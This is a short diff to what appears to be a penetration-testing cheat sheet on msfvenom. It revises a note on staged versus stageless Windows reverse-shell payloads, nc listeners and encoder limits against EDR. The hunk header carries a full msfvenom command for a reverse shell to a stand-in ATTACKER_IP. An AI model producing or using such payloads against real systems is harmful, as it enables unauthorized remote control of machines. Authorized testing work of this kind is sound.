@@ -66,4 +66,4 @@ msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -b "\x00\x0a\x
 
 ## Notes
 
-A *staged* payload (`.../meterpreter/reverse_tcp`) needs the Metasploit handler; a *stageless* one (`reverse_winhttps`, `shell_reverse_tcp`) is self-contained and easier with `nc`. Built-in encoders (`shikata_ga_nai`) rarely beat modern EDR: treat them as encoding, not evasion. Keep payloads inside the engagement scope and clean them up afterwards.
+A *staged* payload (`.../meterpreter/reverse_tcp`) needs the Metasploit handler; a *stageless* one (`shell_reverse_tcp`) is self-contained and catches on a plain `nc` listener. Built-in encoders (`shikata_ga_nai`) rarely beat modern EDR: treat them as encoding, not evasion. Keep payloads inside the engagement scope and clean them up afterwards.
